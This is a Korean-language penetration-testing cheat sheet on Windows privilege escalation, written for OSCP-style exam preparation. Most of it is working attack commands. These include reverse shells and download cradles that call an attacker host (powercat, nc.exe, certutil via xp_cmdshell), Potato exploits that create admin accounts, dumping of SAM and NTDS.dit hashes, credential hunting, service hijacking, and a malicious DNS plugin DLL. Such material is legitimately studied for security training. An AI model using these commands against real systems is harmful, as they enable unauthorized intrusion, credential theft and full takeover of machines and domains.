# Windows 권한 상승 (Windows Privilege Escalation)

- 출처: https://heretek.dev/oscp-cheatsheet/windows-privilege-escalation/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

범위: 현재 머신에서 low-priv 유저 → admin/SYSTEM 으로 가는 방법.

- 참고: CMD vs PowerShell — evil-winrm은 PowerShell, psexec/wmiexec/nc.exe는 CMD. 아래 명령 대부분은 CMD 문법이다.
- PowerShell인데 뭔가 깨지면: `cmd.exe` 로 CMD로 떨어지거나, `&&` → `;`, `2>nul` → `2>$null`, `%VAR%` → `$env:VAR` 로 바꾼다.

## 빠른 참조 — Windows 권한 명령 (Linux → Windows)

Linux 명령은 알지만 Windows 대응 명령을 모를 때:

- 파일 소유자? — CMD `icacls file` / PS `Get-Acl file` (Linux: `ls -la file`)
- 디렉터리 소유자? — CMD `icacls C:\dir` / PS `Get-Acl C:\dir` (Linux: `ls -la /dir`)
- 여기 쓸 수 있나? — CMD `echo test > C:\dir\test.txt` / PS `Set-Content C:\dir\test.txt "test"` (Linux: `echo test >> file`)
- 숨김 파일 보기 — CMD `dir /a` / PS `Get-ChildItem -Force` (Linux: `ls -la`)
- 쓰기 가능 파일 찾기 — CMD `icacls C:\path\* /T` / PS `Get-ChildItem -Recurse` 후 ACL 확인 (Linux: `find / -writable`)
- 이 프로세스 실행자? — CMD `tasklist /v` / PS `Get-WmiObject Win32_Process` (Linux: `ps aux`)
- SYSTEM으로 실행 중? — CMD `tasklist /v | findstr SYSTEM` / PS 동일 (Linux: `ps aux | grep root`)
- 예약 작업 확인 — CMD `schtasks /query /fo LIST /v` / PS 동일 (Linux: `cat /etc/crontab`)

### icacls 권한 코드 (암기)

- `(F)` — Full Control — 악용 가능. 읽기, 쓰기, 삭제, 권한 변경
- `(M)` — Modify — 악용 가능. 읽기, 쓰기, 삭제
- `(W)` — Write — 악용 가능. 파일 덮어쓰기
- `(R)` — Read — 불가. 읽기만
- `(RX)` — Read + Execute — 불가. 읽고 실행만

SYSTEM으로 도는 바이너리에 `BUILTIN\Users:(F)` 또는 `(M)`이 보이면 → 내 페이로드로 교체한다.

## PART 1 — 열거 (이것들을 전부 먼저 돌린다)

- 방법론: 공격 시도 전에 아래 열거 단계를 전부 통과한다. 결과를 모은 뒤에 어떤 공격 경로를 갈지 정한다. 너무 일찍 공격으로 뛰어들면 시야가 좁아져 privesc을 놓친다.

### Enum 1 — 나는 누구인가 (항상 가장 먼저)

```powershell
whoami /all
```

이 한 명령이 유저명, 그룹, 토큰 권한을 전부 준다. 전부 읽는다.

- Integrity level → Medium + 로컬 admin = UAC bypass 후보

### Enum 2 — 시스템 정보

```powershell
hostname
systeminfo
ipconfig /all
```

OS 버전, 아키텍처(x64/x86), 도메인 소속, 설치된 핫픽스를 기록한다.

### AppLocker

AppLocker 우회 방법은 많다. 기본 AppLocker 규칙으로 구성된 경우 아래 디렉터리에 실행 파일을 두면 우회된다 — 기본 화이트리스트:

```text
C:\Windows\System32\spool\drivers\color
```

### Enum 3 — 실행 중인 서비스, 프로세스, 포트

```powershell
tasklist /svc

# What services are running and from where?
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Running processes with paths
Get-Process | Select ProcessName,Path | Sort-Object Path -Unique

# All listening ports
netstat -ano | findstr LISTENING

# Map ALL listening ports to process names (no admin needed)
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort
# If Get-NetTCPConnection unavailable — look up individual PIDs:
tasklist /FI "PID eq <PID>"
Get-Process -Id <PID> | Select-Object Name,Path
```

확인할 것:

- 쓰기 가능한 경로 또는 비기본 디렉터리에서 도는 서비스
- localhost 전용 서비스 (`127.0.0.1`) — 외부 nmap에 안 보이고 SYSTEM으로 도는 경우가 많다
- `0.0.0.0` = 모든 인터페이스에서 리스닝(localhost 포함). `127.0.0.1` = localhost 전용
- 비표준 포트 → 조사할 가치가 있는 커스텀 애플리케이션
- MySQL (3306), 웹 서버 (80/443/8080), DB — creds 확인

### Enum 4 — 비기본 디렉터리와 설치 소프트웨어

```powershell
dir C:\
```

`Windows`, `Program Files`, `Users`, `PerfLogs`가 아닌 것은 전부 의도적으로 놓인 것이다. 확인한다.

비기본 디렉터리에서 .exe를 찾았다면 전체 확인 루틴 실행:

```powershell
# Step 1 — Can you write to it?
icacls "C:\path\to\binary.exe"
# Look for (F)=Full, (M)=Modify, (W)=Write for your user, Everyone, Users, or Authenticated Users
# If NOT writable → skip, can't exploit

# Step 2 — What runs it? (this is the step people miss)
# Is it a service?
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -like '*binary*'} | Select Name,PathName,StartName,State
# Or search by directory:
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -like '*DevelopmentExecutables*'} | Select Name,PathName,StartName,State

# Is it a scheduled task?
schtasks /query /fo LIST /v | findstr /i "binary\|path\|Run As\|Task To Run"

# Is it an AutoRun entry?
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run | findstr /i "binary"
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run | findstr /i "binary"

# Is a running process using it right now?
Get-Process | Where-Object {$_.Path -like '*binary*'} | Select Name,Id,Path

# Step 3 — WHO does it run as?
# For services:
sc.exe qc SERVICENAME
# ⚠️ Use the SERVICE NAME not the FILENAME: sc.exe qc auditTracker NOT sc.exe qc auditTracker.exe
# Look for SERVICE_START_NAME: LocalSystem = SYSTEM = exploit it

# For scheduled tasks:
schtasks /query /tn "TASKNAME" /fo LIST /v | findstr /i "Run As"
# Run As User: SYSTEM = exploit it

# Step 4 — If it runs as SYSTEM and you can write to it → replace the binary
```

```powershell
dir "C:\Program Files"
	dir "C:\Program Files (x86)"
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

버전을 기록 → searchsploit으로 검색.

### Enum 5 — 패스워드 헌팅 (PS 히스토리, 설정, 알려진 위치)

#### 파일 검색

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

IIS creds 같은 민감 정보는 `web.config` 에 있을 수 있다 — 기본 IIS 사이트면 `C:\inetpub\wwwroot\web.config`.

#### 사전 파일

Chrome 커스텀 사전은 유저가 입력한 단어(패스워드 포함)를 새고 있을 수 있다:

```powershell
gc 'C:\Users\student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

#### PowerShell 히스토리 파일

PowerShell 5.0(Windows 10)부터 커맨드 히스토리가 `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` 에 저장된다:

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
Get-ChildItem -Path C:\Users -Recurse -Filter ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content

# One-liner to read EVERY user's PowerShell history
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### PowerShell Credentials (Export-Clixml / DPAPI)

`Connect-VC.ps1` 같은 관리자 스크립트가 `Export-Clixml` 로 credential을 저장할 수 있다. 그 유저 컨텍스트에서 실행하거나(또는 DPAPI 남용) 평문을 복구한다:

```powershell
# The stored credential (encrypted with DPAPI, tied to the user)
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password

# Pull username + password out
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username   # -> bob
$credential.GetNetworkCredential().password   # -> Str0ng3ncryptedP@ss!
```

#### 트랜스크립트, 알려진 위치, 레지스트리

```powershell
# PowerShell transcripts
Get-ChildItem -Path C:\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue

# Known credential file locations
Get-Content C:\xampp\htdocs\wp-config.php -EA SilentlyContinue
Get-Content C:\xampp\phpMyAdmin\config.inc.php -EA SilentlyContinue
Get-Content C:\xampp\mysql\bin\my.ini -EA SilentlyContinue
Get-Content C:\inetpub\wwwroot\web.config -EA SilentlyContinue
Get-Content C:\Windows\Panther\Unattend.xml -EA SilentlyContinue

# Search from a user home (NOT from C:\ — that floods with garbage)
Get-ChildItem -Recurse -Include *.ini,*.cfg,*.xml,*.txt,*.config -EA SilentlyContinue | Select-String "pass" -List | Select Path

# Hidden AppData creds
Get-ChildItem -Path C:\Users\*\AppData -Recurse -Include *.xml,*.config,*.ini,*.txt,*.settings -Force -EA SilentlyContinue | Select-String -Pattern "password|credential|passwd" -List | Select Path

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"

# Saved credentials
cmdkey /list

# AutoRun keys (writable binary?)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

### Enum 6 — 예약 작업

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run" | findstr /i /v "system32"
schtasks /query /fo LIST /v | findstr /i "Run As User" | findstr /i "SYSTEM\|Administrator"
```

흥미로운 작업마다 확인: 누가 실행하나? 바이너리가 쓰기 가능한가? (`icacls <path>`)

예약 작업을 확정 없이 알아보는 특징:

- 유저 디렉터리가 아니라 루트 레벨의 스크립트/바이너리
- 이름에 schedule, update, backup, task 포함
- 다른 유저의 파일을 참조
- copy → execute → delete 패턴 (실행 후 삭제)
- 디렉터리는 있는데 비어 있음
- icacls에서 Authenticated Users에 (M) 또는 (F)

악용: PowerShell download cradle 리버스 쉘:

```powershell
echo IEX(New-Object Net.WebClient).DownloadString('http://KALI:8000/powercat.ps1'); powercat -c KALI -p PORT -e cmd.exe > C:\schedule.ps1
```

리스너와 powercat.ps1을 서빙하는 HTTP 서버를 준비하고 작업 실행을 기다린다.

### Enum 7 — 서비스 바이너리 권한

```cmd
icacls "C:\path\to\service.exe"
accesschk64.exe -uwcv Everyone *
```

SYSTEM으로 도는 바이너리에 `(F)`, `(M)`, `(W)` 를 찾는다.

### Enum 8 — 레지스트리 확인

```cmd
:: AlwaysInstallElevated (both must be 0x1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: SAM/SYSTEM backups
dir C:\Windows\Repair\SAM
dir C:\Windows\System32\config\RegBack\SAM
```

### Enum 9 — 로컬 서비스와 직접 상호작용 (DB, 웹 서버 등)

Enum 3에서 DB나 서비스를 찾았다면 터널링 전에 직접 상호작용한다.

MySQL (3306) — evil-winrm 경유 (비대화형):

```cmd
:: From C:\xampp\mysql\bin or wherever mysql.exe lives
.\mysql.exe -u root --password=""
.\mysql.exe -u root -e "SHOW DATABASES;"
.\mysql.exe -u root -e "SELECT user,host FROM mysql.user;"
.\mysql.exe -u root -e "USE wordpress; SELECT * FROM wp_users;"
```

XAMPP MySQL은 root 패스워드가 비어 있는 경우가 많다. 항상 `--password=""` 부터 시도.
Evil-WinRM은 대화형 프롬프트에서 멈춘다 — 쿼리에는 항상 `-e` 를 쓴다.

MSSQL (1433) — Kali에서:

```bash
# With creds found in config files / web.config
impacket-mssqlclient 'USER:PASS'@TARGET -windows-auth
impacket-mssqlclient 'USER:PASS'@TARGET             # SQL auth fallback
impacket-mssqlclient 'sa:sa'@TARGET                  # try default sa creds
```

```text
-- Once connected:
SELECT name FROM master..sysdatabases;
USE dbname;
SELECT name FROM sysobjects WHERE xtype='U';
SELECT * FROM users;
-- Try RCE:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

MSSQL — Windows에서 (이미 타깃 위에 있을 때):

```powershell
# sqlcmd is often installed on Windows boxes with MSSQL
sqlcmd -S localhost -U sa -P 'password' -Q "SELECT name FROM master..sysdatabases;"
sqlcmd -S localhost -E -Q "SELECT name FROM master..sysdatabases;"    # Windows auth (current user)
sqlcmd -S ".\SQLEXPRESS" -E -Q "SELECT name FROM master..sysdatabases;"  # named instance
```

- 경고: 리버스 쉘/evil-winrm에서는 `-Q` 가 필수다. `-Q` 없이 sqlcmd는 대화형 세션을 열어 쉘이 멈춘다. `-Q` = 실행 후 종료 (mysql의 `-e` 와 동일).
- `-E` = Windows 인증(현재 유저 사용). SYSTEM이면 패스워드가 필요 없다.

Named instance — MSSQL은 MySQL과 다르다:

MySQL은 그냥 포트에서 실행된다. MSSQL에는 named instance가 있다 — 한 서버가 이름이 다른 여러 MSSQL 인스턴스를 실행할 수 있다. 기본 인스턴스는 그냥 `localhost`. Named instance는 `localhost\INSTANCENAME` 형태.

인스턴스 이름 찾는 법:

```powershell
# Check web.config — connection strings tell you everything
Get-Content C:\inetpub\wwwroot\web.config -EA SilentlyContinue
# Look for: server=localhost\SQLEXPRESS or Data Source=.\SQLEXPRESS

# Check WinPEAS output for named pipes
# Look for: SQLLocal\SQLEXPRESS → instance is SQLEXPRESS

# Check running processes
Get-Process | Where-Object {$_.Name -like '*sql*'} | Select Name,Id
# MSSQL$SQLEXPRESS in the process list → instance is SQLEXPRESS

# Check services
Get-Service | Where-Object {$_.DisplayName -like '*SQL*'}
# MSSQL$SQLEXPRESS → instance is SQLEXPRESS
```

빠른 참조 — sqlcmd vs mysql:

- 접속 — `mysql -u root -p` / `sqlcmd -S ".\SQLEXPRESS" -U sa -P pass`
- 쿼리 실행 후 종료 — `mysql -u root -e "query"` / `sqlcmd -S server -U sa -P pass -Q "query"`
- Windows 인증 — 해당 없음 / `sqlcmd -S server -E`
- DB 선택 — `mysql -u root db` / `sqlcmd -S server -E -d dbname`
- Named instance — 해당 없음(포트만) / `-S ".\SQLEXPRESS"` 또는 `-S "localhost\SQLEXPRESS"`

MSSQL 접속 후 할 일 (순서대로):

Step 1 — DB 열거:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "SELECT name FROM master..sysdatabases;"
```

`master`, `tempdb`, `model`, `msdb`는 시스템 DB라 무시. 나머지는 전부 커스텀이고 조사할 가치가 있다.

Step 2 — 각 커스텀 DB의 테이블 나열:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -d DBNAME -Q "SELECT name FROM sysobjects WHERE xtype='U';"
```

`DBNAME`은 Step 1 결과로 교체. `users`, `credentials`, `accounts`, `logins`, `employees` 같은 테이블을 찾는다.

Step 3 — 흥미로운 테이블의 컬럼 나열:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -d DBNAME -Q "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='TABLENAME');"
```

`TABLENAME`은 Step 2 결과로 교체. `username`, `password`, `email`, `hash` 같은 컬럼을 찾는다.

Step 4 — 데이터 덤프:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -d DBNAME -Q "SELECT * FROM TABLENAME;"
# Or specific columns:
sqlcmd -S ".\SQLEXPRESS" -E -d DBNAME -Q "SELECT username,password FROM users;"
```

찾은 모든 credential → creds 표에 추가 → 즉시 전 머신 스프레이.

Step 5 — xp_cmdshell → RCE (SQL 서비스 계정으로):

```powershell
# Enable xp_cmdshell
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
```

- 경고: sqlcmd 경유의 xp_cmdshell 출력은 BLIND다 — 명령 출력이 안 보인다. ping으로 RCE 확인:

```powershell
# Test: does it execute?
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC xp_cmdshell 'ping ATTACKER_IP';"
# Listen on Kali: sudo tcpdump -i tun0 icmp — if you see pings, you have RCE

# Check who it runs as
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC xp_cmdshell 'whoami > C:\Windows\Temp\whoami.txt';"
type C:\Windows\Temp\whoami.txt
# If different user than you → this is lateral movement or privesc
```

리버스 쉘 확보:

```powershell
# Download nc.exe to target
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER/nc.exe C:\Windows\Temp\nc.exe';"

# Catch on Kali: rlwrap nc -lvnp 443
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe';"
```

또는 PowerShell 리버스 쉘 (Kali에서 `base64 -w 0` 으로 인코딩):

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC xp_cmdshell 'powershell -nop -w hidden -e BASE64_PAYLOAD';"
```

xp_cmdshell이 거부되면 → SQL 유저가 sysadmin이 아니다. Step 7(해시 훔치기)으로.

Step 6 — xp_cmdshell 실패 시 MSSQL로 파일 읽기:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\proof.txt', SINGLE_CLOB) AS x;"
```

Step 7 — 다른 게 전부 실패하면 해시 훔치기:

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXEC master..xp_dirtree '\\ATTACKER_IP\share';"
# Catch with: sudo responder -I tun0 -A
# Crack: hashcat -m 5600 hash.txt rockyou.txt
```

Step 8 — linked server 확인 (다른 SQL 서버로 lateral movement):

```powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "SELECT name FROM master..sysservers;"
# If linked servers exist: EXEC('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

MySQL과 같은 열거 흐름, 문법만 다름:

- DB 나열 — MySQL `SHOW DATABASES;` / MSSQL(sqlcmd) `SELECT name FROM master..sysdatabases;`
- 테이블 나열 — `SHOW TABLES;` / `SELECT name FROM sysobjects WHERE xtype='U';`
- 컬럼 나열 — `DESCRIBE tablename;` / `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename');`
- 데이터 덤프 — `SELECT * FROM users;` / `SELECT * FROM users;` (동일)

PostgreSQL (5432) — Kali에서:

```bash
psql -h TARGET -U postgres -W         # prompts for password
psql -h TARGET -U postgres -d dbname   # connect to specific database
```

```text
-- Once connected:
\l                              -- list databases
\dt                             -- list tables
\du                             -- list users (check for superuser!)
SELECT * FROM users;
-- If superuser → RCE:
COPY (SELECT '') TO PROGRAM 'whoami';
```

시도할 기본 creds:

- MySQL — root — (빈 값), root, toor
- MSSQL — sa — sa, (빈 값), Password1
- PostgreSQL — postgres — postgres, (빈 값), admin

localhost 전용 웹 서비스는 터널로 꺼낸다:

```bash
# Attacker: ./chisel server -p 9999 --reverse
# Target: .\chisel.exe client ATTACKER:9999 R:PORT:127.0.0.1:PORT
# Then browse http://127.0.0.1:PORT on Kali
```

- 경고: 서비스가 `127.0.0.1`에 바인딩되어 있으면 chisel 포워드도 반드시 `127.0.0.1` 을 써야 한다 — 머신의 외부 IP가 아니다.

### Enum 10 — 자동 도구 (수동 열거 이후)

```powershell
.\winpeas.exe cmd > winpeas_output.txt
```

출력을 보면서 동시에 파일로 저장 (Linux `tee` 처럼):

```powershell
.\winpeas.exe cmd | Tee-Object -FilePath C:\Users\Public\winpeas.txt
```

- `Tee-Object` 는 PowerShell에서만 동작 (evil-winrm은 괜찮다). 기본 CMD나 nc 쉘에서는 안 된다.
- 어떤 쉘에서든 WinPEAS가 멈추면 파일 리다이렉트만 하고 나중에 읽는다:

```powershell
.\winpeas.exe cmd > C:\Users\Public\wp.txt 2>&1
type C:\Users\Public\wp.txt
# Or download from evil-winrm: download C:\Users\Public\wp.txt
```

```powershell
powershell -ep bypass ". .\PowerUp.ps1; Invoke-AllChecks"
```

이 도구들은 수동 열거 이후에 돌린다 — 발견을 확정하고 놓친 것을 잡아줄 수 있다.

### Enum 11 — 도메인 확인

```powershell
systeminfo | findstr /i "domain"
net user /domain
```

## PART 2 — 공격 기법 (발견한 것 기준 참조)

- 아래는 열거에서 발견한 것별로 정리된 상세 악용 단계. 열거 결과에 맞는 공격을 찾아 적용한다.

### Attack: 토큰 권한

```powershell
whoami /priv
whoami /all
```

#### SeImpersonatePrivilege (가장 흔함 — IIS/MSSQL 서비스 계정)

OS 버전별 도구:

- Server 2016 이하 — JuicyPotato
- Server 2019+ / Win10 1809+ — PrintSpoofer
- 범용/최신 — GodPotato 또는 SigmaPotato

```powershell
PrintSpoofer.exe -i -c cmd
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "ATTACKER 443 -e cmd.exe" -t * -c {CLSID}
.\SigmaPotato.exe "net user pwned Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators pwned /add"
```

쉘을 막지 않고 GodPotato 실행:

```powershell
# PowerShell — launches independently, your session stays usable
Start-Process -FilePath ".\GodPotato-NET4.exe" -ArgumentList '-cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"' -WindowStyle Hidden
```

```powershell
:: CMD — background execution
start /b .\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
```

- 경고: Potato 쉘은 불안정한 자식 프로세스다. SYSTEM 획득 즉시 admin 유저를 만든다:

```powershell
net user hacker hacker123! /add
net localgroup Administrators hacker /add
net localgroup "Remote Management Users" hacker /add
```

그다음 제대로 연결: `evil-winrm -i TARGET -u hacker -p 'hacker123!'`

- `-cmd` 안의 모든 것은 전체 절대경로로: `nc.exe` 가 아니라 `C:\Windows\Temp\nc.exe` (중요)
- msfvenom .exe 대신 `nc.exe` 리버스 쉘 패턴 (msfvenom exe 페이로드는 조용히 죽는 경우가 많다)
- 패턴: `GodPotato -cmd "C:\full\path\to\nc.exe ATTACKER PORT -e cmd.exe"`
- nc.exe가 연결 안 되면 `cmd.exe /c` 로 감싼다: `GodPotato -cmd "cmd.exe /c C:\path\nc.exe ATTACKER PORT -e cmd.exe"`
- 리버스 쉘이 계속 실패하면 출력을 파일로 리다이렉트:

```powershell
.\GodPotato-NET4.exe -cmd "cmd.exe /c (whoami & type C:\Users\Administrator\Desktop\proof.txt) > C:\Windows\Temp\out.txt 2>&1"
type C:\Windows\Temp\out.txt
```

- `&&` 이 아니라 `&` 를 쓴다 (& 는 전부 실행, && 는 첫 실패에서 중단)
- `>` 리다이렉트 전에 괄호로 명령을 묶는다

#### SeBackupPrivilege → SAM/SYSTEM 덤프

권한과 무관하게 임의 파일 읽기 가능. SAM+SYSTEM 하이브를 복사해 로컬 해시 전부를 덤프한다. (실전 예: Return(HTB) — svc-printer가 Server Operators 그룹 경유로 SeBackupPrivilege 보유)

```powershell
# Step 1: Create a temp directory to save the files
mkdir C:\Temp

# Step 2: Save the SAM and SYSTEM registry hives
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system

# Step 3: Download both files to Kali via evil-winrm
cd C:\Temp
download sam
download system
```

Kali에서 해시 전부 덤프:

```bash
impacket-secretsdump -sam sam -system system LOCAL
# Use the NT hash (second hash after the second colon) for Pass-the-Hash
```

Administrator NTLM 해시로 Pass-the-Hash:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H '<NTLM_HASH>'
```

- 원리: SeBackupPrivilege는 파일 ACL을 우회 — 백업 소프트웨어가 보호된 파일을 읽게 하려는 권한. SAM 하이브에 로컬 계정 해시가, SYSTEM에 복호화용 부트 키가 있다. 둘이면 Administrator 포함 전체 로컬 해시.

#### SeImpersonate (Potato) → SYSTEM → SAM+SYSTEM+SECURITY 한 번에 덤프

```powershell
# Step 1 — upload GodPotato (your http server already running on KALI:8000)
iwr http://KALI:8000/GodPotato-NET4.exe -OutFile $env:TEMP\g.exe -UseBasicParsing

# Step 2 — single SYSTEM exec: reg save all three + icacls so YOUR user can read
& $env:TEMP\g.exe -cmd "cmd.exe /c reg save HKLM\SAM C:\Users\YOU\Documents\sam.save /y & reg save HKLM\SYSTEM C:\Users\YOU\Documents\system.save /y & reg save HKLM\SECURITY C:\Users\YOU\Documents\security.save /y & icacls C:\Users\YOU\Documents\sam.save /grant Everyone:F & icacls C:\Users\YOU\Documents\system.save /grant Everyone:F & icacls C:\Users\YOU\Documents\security.save /grant Everyone:F"
# Note: icacls is what makes the SYSTEM-owned files readable by your low-priv user afterward
```

하이브 꺼내기 — `C$`/`ADMIN$` 에 쓸 수 없으면(아직 로컬 admin이 아님) evil-winrm 경유의 base64-over-stdout 트릭을 쓴다:

```bash
# On Kali — one-line PS per hive (use FORWARD SLASHES to dodge bash \U escape hell)
for f in sam system security; do
  echo "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:/Users/YOU/Documents/$f.save'))" | \
    evil-winrm -i IP -u USER -p PASS 2>&1 | \
    grep -E '^[A-Za-z0-9+/]{50,}={0,2}$' | tr -d '\r\n' | base64 -d > $f.save
done

# Then locally:
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

secretsdump 출력에서 볼 것 (예시):

```text
Mary.Williams:1002:...:...                                          # other local accounts
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
[*] _SC_wampapache64
```

- 경고: bash → evil-winrm으로 명령을 파이프할 때 PowerShell 경로는 슬래시를 쓴다. `C:\Users` 는 bash가 `\U` 로 해석해 명령이 깨진다. PowerShell은 `C:/Users/...` 를 네이티브로 받는다.

#### SeBackupPrivilege → NTDS.dit (도메인 해시 — DC 전용)

NTDS.dit는 DC 프로세스가 잠근 라이브 DB라 `reg save` 로는 못 건드린다. VSS가 파일이 잠기지 않은 스냅샷을 만든다. DC 전용이고 도메인 계정 해시 전부를 준다.

```powershell
# Must run from a writable directory
cd C:\Temp
echo "set context persistent nowriters" | out-file C:\Windows\Temp\shadow.dsh -encoding ascii
echo "add volume c: alias pwn" | out-file C:\Windows\Temp\shadow.dsh -append -encoding ascii
echo "create" | out-file C:\Windows\Temp\shadow.dsh -append -encoding ascii
echo "expose %pwn% z:" | out-file C:\Windows\Temp\shadow.dsh -append -encoding ascii

diskshadow /s C:\Windows\Temp\shadow.dsh
# Z: is now a frozen snapshot of C:

# /b flag = backup mode, bypasses ACLs using SeBackupPrivilege
robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg save hklm\system C:\Windows\Temp\system

download C:\Windows\Temp\ntds.dit
download C:\Windows\Temp\system
```

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
evil-winrm -i <DC_IP> -u Administrator -H '<NTLM_HASH>'
```

SAM vs NTDS.dit:

- 로컬 해시 — `reg save hklm\sam` — 아무 Windows나 가능
- 도메인 해시 — VSS + robocopy /b — DC 전용

#### SeRestorePrivilege → 시스템 파일/DLL 덮어쓰기

임의 파일 쓰기 권한으로 서비스 바이너리나 DLL을 덮어쓴다.

### Windows 권한 그룹 (토큰 권한과 함께 확인)

- 항상 `whoami /all` 을 실행한다, `whoami /priv` 만 하지 않는다. 그룹 멤버십이 토큰 권한보다 더 가치 있을 수 있다.

#### Server Operators → 서비스 바이너리 하이재킹 → SYSTEM

Server Operators 멤버는 서비스 시작/중지와 서비스 바이너리 경로 재구성이 가능하다.

```powershell
# Step 1: Upload nc.exe (from evil-winrm)
upload /usr/share/windows-binaries/nc.exe
move nc.exe C:\Windows\Temp\nc.exe

# Step 2: Start listener on Kali
nc -lvp 443

# Step 3: Reconfigure a running service to call nc.exe
# Find a running service to hijack (VMTools works on HTB, try others if not)
sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER 443"

# Step 4: Restart the service
sc.exe stop VMTools
sc.exe start VMTools
# Note: sc start will "fail" with a timeout error — this is normal.
# The service starts nc.exe, nc.exe connects back, service manager times out.
# Your listener catches the SYSTEM shell.
```

어떤 서비스를 하이재킹하나? 중지 AND 시작이 가능한 아무 서비스:

```powershell
# List services you can control:
services.msc       # GUI (if RDP)
sc.exe query type= all state= running
# VMTools is commonly available on HTB/PG. Otherwise try any non-critical running service.
```

SYSTEM이 나오는 이유: 서비스는 기본으로 LocalSystem에서 실행된다. 바이너리 경로를 재구성하고 재시작하면 Windows가 내 바이너리를 서비스 계정(SYSTEM)으로 실행한다.

#### Backup Operators → SAM/SYSTEM 덤프 → PtH

SeBackupPrivilege와 같은 효과 (Backup Operators 멤버는 자동으로 보유). 위 SeBackupPrivilege 단계를 따른다.

#### DnsAdmins → DNS 서비스 DLL 인젝션 → SYSTEM

DnsAdmins 멤버는 DNS 서버가 플러그인 DLL을 로드하도록 설정할 수 있다. DNS는 SYSTEM으로 실행된다.

```bash
# Step 1: Generate malicious DLL on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o evil.dll

# Step 2: Host via SMB server
impacket-smbserver share . -smb2support

# Step 3: From Windows shell, configure DNS to load your DLL
dnscmd.exe /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll

# Step 4: Start listener + restart DNS service
nc -lvp 443
sc.exe stop dns
sc.exe start dns
```

#### Account Operators → 비관리 계정 수정 → lateral movement

Account Operators는 대부분의 유저 계정을 생성/수정하고 비권한 그룹에 추가할 수 있다.

```powershell
# Create a new user
net user attacker P@ss123! /add
# Add to a group you want to be in (can't add to Domain Admins or Administrators directly)
net localgroup "Remote Management Users" attacker /add
```

